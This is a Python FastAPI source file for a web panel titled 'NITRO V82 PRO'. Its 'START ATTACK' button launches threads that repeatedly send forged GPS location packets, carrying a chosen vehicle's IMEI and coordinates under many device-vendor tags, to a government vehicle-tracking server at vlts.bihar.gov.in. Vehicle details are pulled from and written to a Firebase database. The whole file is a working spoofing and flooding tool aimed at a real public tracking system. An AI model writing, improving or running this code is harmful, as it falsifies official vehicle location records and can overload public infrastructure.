import socket, threading, time, requests, json
from datetime import datetime, timedelta, timezone
from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()

# --- 🚀 NAYA TARIKA: DIRECT REST API (NO SDK) ---
# Isme kisi JSON file ya initialize_app() ki zaroorat nahi hai
DB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com"

firing = False
total_sent = 0
logs = []
TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL"]

@app.get("/fetch_data")
def fetch_data(vno: str):
    v_up = vno.upper().strip()
    try:
        # Direct REST GET Request
        response = requests.get(f"{DB_URL}/Data_Records/{v_up}.json")
        data = response.json()
        if data:
            return {"found": True, "imei": data.get('IMEI_No',''), "lat": data.get('Lat',''), "lon": data.get('Lon','')}
    except Exception as e:
        return {"found": False, "err": "REST_API_FAIL"}
    return {"found": False, "err": "NOT_IN_DB"}

@app.get("/init")
def init(v:str, i:str, lt:str, ln:str):
    global firing, total_sent, logs
    if not firing:
        v_up = v.upper().strip()
        firing, total_sent = True, 0
        logs = [f"<span style='color:#fff'>[SYS] TARGET LOCKED: {v_up}</span>"]
        
        # Direct REST PUT Request (Data Save karne ke liye)
        payload = {"IMEI_No": i, "Lat": lt, "Lon": ln, "Status": "Active"}
        try:
            requests.put(f"{DB_URL}/Data_Records/{v_up}.json", json=payload)
            logs.append("<span style='color:#0f0'>[DB] REST_SYNC: SUCCESS</span>")
        except:
            logs.append("<span style='color:#f00'>[DB] REST_SYNC: FAILED</span>")
        
        for tag in TAGS:
            threading.Thread(target=handshake_worker, args=(tag,i,v_up,lt,ln), daemon=True).start()
    return {"ok": True}

def handshake_worker(tag, imei, vno, lat, lon):
    global firing, total_sent, logs
    while firing:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect(("vlts.bihar.gov.in", 9999))
            now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
            dt, tm = now.strftime('%d%m%Y'), now.strftime('%H%M%S')
            pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\\r\\n"
            s.sendall(bytes(pkt, 'ascii'))
            total_sent += 1
            s.close()
            logs.append(f"<span style='color:#0f0'>[{tm}] {tag} OK</span>")
            if len(logs) > 10: logs.pop(0)
            time.sleep(0.1)
        except: time.sleep(1)

@app.get("/status")
def status(): return {"c": total_sent, "l": logs}

@app.get("/stop")
def stop(): global firing; firing = False; return {"ok": True}

@app.get("/", response_class=HTMLResponse)
async def home():
    return """
    <html><head><title>NITRO V82 PRO</title><style>
    body { background:#000; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; overflow:hidden; }
    .box { width:400px; border:2px solid #0f0; padding:25px; background:rgba(0,10,0,0.98); border-radius:15px; box-shadow: 0 0 20px #0f0; text-align:center; }
    input { width:100%; background:#000; border:1px solid #333; color:#0f0; padding:12px; outline:none; text-transform:uppercase; margin-top:8px; font-family:monospace; }
    button { width:100%; padding:15px; margin-top:15px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; }
    button:hover { background:#0f0; color:#000; }
    #log { height:180px; background:#000; border:1px solid #222; margin-top:15px; padding:10px; font-size:11px; overflow-y:auto; line-height:1.5; }
    </style></head><body>
    <div class="box">
        <h2 style="letter-spacing:4px;">NITRO V82 PRO</h2>
        <input type="text" id="v" oninput="this.value=this.value.toUpperCase()" onblur="fetchData()" placeholder="VEHICLE NO">
        <input type="text" id="i" placeholder="IMEI">
        <div style="display:flex;gap:5px;"><input type="text" id="lt" placeholder="LAT"><input type="text" id="ln" placeholder="LON"></div>
        <button onclick="st()" style="background:#0f0; color:#000;">START ATTACK</button>
        <button onclick="sp()" style="color:red;border-color:red;">STOP</button>
        <button onclick="location.reload()" style="color:yellow;border-color:yellow;font-size:10px;">RESET SYSTEM</button>
        <div id="log">READY...</div>
        <div style="margin-top:10px; display:flex; justify-content:space-between; font-weight:bold;"><span>SENT: <b id="c">0</b></span><span id="st" style="color:lime">IDLE</span></div>
    </div>
    <script>
        let m;
        function fetchData() {
            let v = document.getElementById('v').value.trim();
            if(v.length > 4) {
                document.getElementById('log').innerHTML += `<br>[SYS] REST_FETCHING ${v}...`;
                fetch(`/fetch_data?vno=${v}`).then(r=>r.json()).then(d=>{
                    if(d.found) {
                        document.getElementById('i').value=d.imei; document.getElementById('lt').value=d.lat; document.getElementById('ln').value=d.lon;
                        document.getElementById('log').innerHTML += "<br><span style='color:lime'>[SUCCESS] DB_LOADED</span>";
                    } else { document.getElementById('log').innerHTML += `<br><span style='color:red'>[FAIL] ${d.err}</span>`; }
                    var l=document.getElementById("log"); l.scrollTop=l.scrollHeight;
                });
            }
        }
        function st() {
            fetch(`/init?v=${document.getElementById('v').value}&i=${document.getElementById('i').value}&lt=${document.getElementById('lt').value}&ln=${document.getElementById('ln').value}`);
            document.getElementById('st').innerText="RUNNING";
            if(!m) m = setInterval(() => { fetch('/status').then(r=>r.json()).then(d=>{ document.getElementById('c').innerText=d.c; document.getElementById('log').innerHTML=d.l.join("<br>"); var l=document.getElementById("log"); l.scrollTop=l.scrollHeight; }); }, 1000);
        }
        function sp() { fetch('/stop'); clearInterval(m); m=null; document.getElementById('st').innerText="IDLE"; }
    </script></body></html>
    """
